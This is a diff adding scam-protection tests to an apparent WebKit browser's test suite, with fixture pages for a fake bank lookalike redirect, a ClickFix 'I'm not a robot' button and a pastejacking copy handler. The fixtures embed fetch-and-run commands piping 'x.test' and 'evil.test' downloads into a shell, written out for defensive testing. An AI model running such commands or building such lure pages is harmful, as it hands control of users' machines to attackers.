@@ -87,6 +87,14 @@ PAGES = {
                 "<p id='ok'>text</p></body></html>"),
     "/menu": ("<html><title>menu</title><body><p><a id='link' href='/done?utm_source=mail&amp;k=1'>a link</a></p>"
               "<p><span id='words'>hello   world</span></p></body></html>"),
+    # a fake "I'm not a robot" page (ClickFix): its button copies a command to paste into a Terminal
+    "/clickfix": ("<html><title>clickfix</title><body><button id='b' style='width:300px;height:80px' onclick=\""
+                  "navigator.clipboard.writeText('curl -s http://x.test/v | bash # I am not a robot - Verification ID 1')"
+                  "\">Verify</button></body></html>"),
+    # an install guide; with window.jack set, its copy handler swaps what the user copies (pastejacking)
+    "/install-guide": ("<html><title>install-guide</title><body><pre id='cmd'>curl -fsSL https://get.example.test | sh</pre>"
+                       "<script>document.addEventListener('copy', e => { if (window.jack) { e.clipboardData.setData("
+                       "'text/plain', 'wget -qO- http://evil.test/x | sh'); e.preventDefault(); } })</script></body></html>"),
     "/dlframes": "<html><title>dlframes</title><body>" + "".join(
         f"<iframe style='display:none' src='/dl?n={i}'></iframe>" for i in range(5)) + "</body></html>",
 }
@@ -160,6 +168,12 @@ class Handler(http.server.BaseHTTPRequestHandler):
             self.wfile.write(b"PK" * 5)
             self.wfile.flush()
             self.close_connection = True
+            return
+        if path == "/to-fake-bank":  # a short link that leads to a copy of a bank's address
+            self.send_response(302)
+            self.send_header("Location", "http://sbi-kyc-update.invalid/login")
+            self.send_header("Content-Length", "0")
+            self.end_headers()
             return
         if path.endswith(".desktop"):
             body = b"[Desktop Entry]\nType=Application\nExec=true\n"
@@ -1796,6 +1810,112 @@ class WindowFeatureTests(unittest.TestCase):
         self.win._on_arrow_scheme(again, None)
         self.assertNotIn("refresh", again.body, "the token is single-use")
         self.win._http_allowed_hosts.discard("plain-only.example")
+
+    # ---- scam warnings ----------------------------------------------------
+    class SchemeReq:
+        def __init__(self, uri): self.uri, self.body = uri, None
+        def get_uri(self): return self.uri
+        def finish(self, stream, length, ctype): self.body = stream.read_bytes(length, None).get_data().decode()
+
+    def test_lookalike_bank_address_is_stopped_before_it_loads(self):
+        win = self.win
+        wv = self.load("/blank")
+        fake = "https://hdfc-netbanking.invalid/login"
+        wv.load_uri(fake)
+        self.assertTrue(spin(lambda: "This may be a fake site" in (js(wv, "document.body.innerText") or ""), 8))
+        text = js(wv, "document.body.innerText")
+        self.assertIn("HDFC Bank", text)
+        self.assertEqual(wv.get_uri(), fake, "the address bar keeps showing the fake address")
+        self.assertEqual(js(wv, "document.querySelector('a.btn').href"), "https://hdfcbank.com/")
+        href = js(wv, "document.querySelector('a.alt').href")
+        self.assertTrue(href.startswith("arrow://allow-site?t="), href)
+
+        forged = self.SchemeReq("arrow://allow-site?t=guess")
+        win._on_arrow_scheme(forged, None)
+        self.assertNotIn("hdfc-netbanking.invalid", win.site_settings, "a guessed token does nothing")
+        real = self.SchemeReq(href)
+        win._on_arrow_scheme(real, None)
+        self.assertIn(fake, real.body)
+        self.assertTrue(win.site_settings["hdfc-netbanking.invalid"]["lookalike_ok"])
+        self.assertFalse(win._stop_lookalike(wv, fake), "once the user chose to go on, it opens")
+        again = self.SchemeReq(href)
+        win._on_arrow_scheme(again, None)
+        self.assertNotIn("refresh", again.body, "the token is single-use")
+
+    def test_lookalike_address_after_a_redirect_is_stopped_too(self):
+        win = self.win
+        wv = self.load("/blank")
+        wv.load_uri(self.base + "/to-fake-bank")
+        self.assertTrue(spin(lambda: "This may be a fake site" in (js(wv, "document.body.innerText") or ""), 8))
+        self.assertIn("State Bank of India", js(wv, "document.body.innerText"))
+        win.lookalike_warning_enabled = False
+        self.addCleanup(setattr, win, "lookalike_warning_enabled", True)
+        self.assertFalse(win._stop_lookalike(wv, "http://sbi-kyc-update.invalid/login"), "the switch turns it off")
+        self.load("/thin", "thin")  # ordinary sites aren't touched
+
+    def copy_warnings(self, response):
+        """Answers every copied-command warning that comes up with `response`; returns their texts."""
+        seen = []
+
+        def answer():
+            for w in Gtk.Window.list_toplevels():
+                if isinstance(w, Gtk.MessageDialog) and w.get_visible() and "copied" in (w.props.text or ""):
+                    seen.append((w.props.text, w.props.secondary_text))
+                    w.response(response)
+            return True
+
+        source = GLib.timeout_add(100, answer)
+        self.addCleanup(GLib.source_remove, source)
+        return seen
+
+    def clipboard_page(self, path, title):
+        win = self.win
+        wv = self.load(path, title)
+        win.is_active = lambda: True  # the test window may not have the desktop's focus
+        self.addCleanup(lambda: delattr(win, "is_active"))
+        win._clipboard_warned_text = None
+        clipboard = Gtk.Clipboard.get(Gdk.SELECTION_CLIPBOARD)
+        clipboard.set_text("nothing yet", -1)
+        spin(lambda: False, 0.3)
+        wv.grab_focus()
+        return wv, clipboard
+
+    def test_clipboard_guard_warns_about_a_fake_robot_check_and_removes_the_command(self):
+        wv, clipboard = self.clipboard_page("/clickfix", "clickfix")
+        seen = self.copy_warnings(Gtk.ResponseType.ACCEPT)
+        self.mouse_click(wv, "b", 1)
+        self.assertTrue(spin(lambda: seen, 5), "no warning for a command a page copied")
+        self.assertIn("hidden command", seen[0][0])
+        self.assertIn("127.0.0.1", seen[0][1])
+        self.assertTrue(spin(lambda: clipboard.wait_for_text() in ("", None), 3), clipboard.wait_for_text())
+
+    def test_clipboard_guard_leaves_the_users_own_copy_alone_but_not_a_swapped_one(self):
+        win = self.win
+        wv, clipboard = self.clipboard_page("/install-guide", "install-guide")
+        seen = self.copy_warnings(Gtk.ResponseType.REJECT)
+        js(wv, "getSelection().selectAllChildren(document.getElementById('cmd')); 1")
+        win._user_copy(wv, WebKit2.EDITING_COMMAND_COPY)  # what the right-click Copy runs
+        self.assertTrue(spin(lambda: clipboard.wait_for_text() == "curl -fsSL https://get.example.test | sh", 3))
+        spin(lambda: seen, 1.5)
+        self.assertEqual(seen, [], "the user copied what they selected")
+
+        js(wv, "window.jack = true; 1")
+        win._user_copy(wv, WebKit2.EDITING_COMMAND_COPY)
+        self.assertTrue(spin(lambda: seen, 5), "no warning when the page swapped what was copied")
+        self.assertEqual(seen[0][0], "This page copied a command")
+        self.assertEqual(clipboard.wait_for_text(), "wget -qO- http://evil.test/x | sh", "Keep it copied keeps it")
+
+        seen.clear()
+        win._clipboard_warned_text = None
+        set_trust = lambda: bb.set_site_value(win.site_settings, "127.0.0.1", "clipboard_ok", True)
+        set_trust()
+        clipboard.set_text("nothing yet", -1)
+        spin(lambda: False, 0.3)
+        wv.grab_focus()
+        win._user_copy(wv, WebKit2.EDITING_COMMAND_COPY)
+        self.assertTrue(spin(lambda: clipboard.wait_for_text() == "wget -qO- http://evil.test/x | sh", 3))
+        spin(lambda: seen, 1.5)
+        self.assertEqual(seen, [], "a site the user trusts isn't warned about")
 
     # ---- passwords ------------------------------------------------------
     def test_password_save_then_fill(self):
